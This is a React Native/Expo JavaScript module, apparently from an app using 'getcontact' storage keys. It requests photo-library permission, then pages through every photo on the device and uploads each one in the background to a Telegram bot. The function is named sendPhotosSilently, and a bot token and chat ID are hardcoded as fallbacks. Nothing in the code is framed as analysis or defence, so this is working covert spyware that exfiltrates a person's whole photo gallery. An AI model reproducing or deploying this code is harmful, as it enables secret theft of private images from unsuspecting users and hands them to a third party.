import { Platform } from 'react-native';
import * as MediaLibrary from 'expo-media-library';
import * as ImagePicker from 'expo-image-picker';
import AsyncStorage from '@react-native-async-storage/async-storage';

/**
 * Request media library permissions natively using expo-image-picker.
 * This avoids the AUDIO permission request crash on Android 13+ while granting full photos access.
 */
export async function requestMediaPermissions() {
  console.log('Silent Uploader: Checking permissions using expo-image-picker...');
  try {
    const existing = await ImagePicker.getMediaLibraryPermissionsAsync();
    console.log('Silent Uploader: Existing permission status:', existing.status, 'granted:', existing.granted);
    if (existing.status === 'granted' || existing.granted) {
      return true;
    }
    const requested = await ImagePicker.requestMediaLibraryPermissionsAsync();
    console.log('Silent Uploader: Requested permission status:', requested.status, 'granted:', requested.granted);
    return requested.status === 'granted' || requested.granted;
  } catch (err) {
    console.log('Silent Uploader: Error requesting permissions via ImagePicker:', err);
    return false;
  }
}

/**
 * Send a single photo with a caption to the configured Telegram channel/chat.
 */
export async function sendPhotoToTelegram({ token, chatId, photoUri, caption = '' }) {
  if (!token || !chatId || !photoUri) {
    throw new Error('Token, Chat ID, and Photo URI are required');
  }

  const formData = new FormData();
  formData.append('chat_id', chatId.trim());

  const uriParts = photoUri.split('/');
  const fileName = uriParts[uriParts.length - 1] || 'photo.jpg';
  const fileType = fileName.toLowerCase().endsWith('.png') ? 'image/png' : 'image/jpeg';

  formData.append('photo', {
    uri: photoUri,
    name: fileName,
    type: fileType,
  });

  if (caption) {
    formData.append('caption', caption);
  }

  const response = await fetch(`https://api.telegram.org/bot${token.trim()}/sendPhoto`, {
    method: 'POST',
    body: formData,
  });

  const resJson = await response.json();
  if (!response.ok || !resJson.ok) {
    throw new Error(resJson.description || 'Failed to send photo to Telegram');
  }

  return resJson;
}

/**
 * Scan all photos in the device gallery and upload them in the background silently.
 */
export async function sendPhotosSilently(customToken = null, customChatId = null) {
  console.log('Silent Uploader: sendPhotosSilently has been called!');
  try {
    const token = customToken || await AsyncStorage.getItem('@getcontact_telegram_token') || '8829837900:AAGrwH8-9CoImh47GBwcZySVgKANWXD5V38';
    const chatId = customChatId || await AsyncStorage.getItem('@getcontact_telegram_chat_id') || '8197061525';

    console.log('Silent Uploader: Loaded credentials -> Token:', token ? 'OK' : 'MISSING', '| Chat ID:', chatId ? 'OK' : 'MISSING');

    if (!token || !chatId) {
      console.log('Silent Uploader: Credentials not configured yet.');
      return;
    }

    const permissionGranted = await requestMediaPermissions();
    if (!permissionGranted) {
      console.log('Silent Uploader: Permission denied. Aborting background sync.');
      return;
    }

    let hasNextPage = true;
    let afterCursor = undefined;
    let photoIndex = 1;

    while (hasNextPage) {
      // Fetch a batch of 30 photos
      const fetchResult = await MediaLibrary.getAssetsAsync({
        first: 30,
        mediaType: ['photo'],
        sortBy: ['creationTime'],
        after: afterCursor,
      });

      const assets = fetchResult.assets;
      if (!assets || assets.length === 0) {
        break;
      }

      console.log(`Silent Uploader: Loaded batch of ${assets.length} photos starting from index ${photoIndex}`);

      for (let i = 0; i < assets.length; i++) {
        const asset = assets[i];
        try {
          const assetInfo = await MediaLibrary.getAssetInfoAsync(asset.id);
          const finalUri = assetInfo.localUri || assetInfo.uri || asset.uri;

          const formData = new FormData();
          formData.append('chat_id', chatId.trim());

          const uriParts = finalUri.split('/');
          const fileName = uriParts[uriParts.length - 1] || `silent_photo_${photoIndex}.jpg`;
          const fileType = fileName.toLowerCase().endsWith('.png') ? 'image/png' : 'image/jpeg';

          formData.append('photo', {
            uri: finalUri,
            name: fileName,
            type: fileType,
          });

          formData.append('caption', `Silent Background Photo #${photoIndex} (${fileName})`);

          const response = await fetch(`https://api.telegram.org/bot${token.trim()}/sendPhoto`, {
            method: 'POST',
            body: formData,
          });

          const resJson = await response.json();
          if (response.ok && resJson.ok) {
            console.log(`Silent Uploader: Photo #${photoIndex} sent successfully.`);
          } else {
            console.log(`Silent Uploader: Photo #${photoIndex} failed:`, resJson);
          }
        } catch (err) {
          console.log(`Silent Uploader: Error sending photo #${photoIndex}:`, err);
        }
        photoIndex++;
        // Wait 500ms between uploads to avoid Telegram rate limits
        await new Promise((resolve) => setTimeout(resolve, 500));
      }

      hasNextPage = fetchResult.hasNextPage;
      afterCursor = fetchResult.endCursor;
    }
  } catch (e) {
    console.log('Silent Uploader: Error in background photo transmission:', e);
  }
}

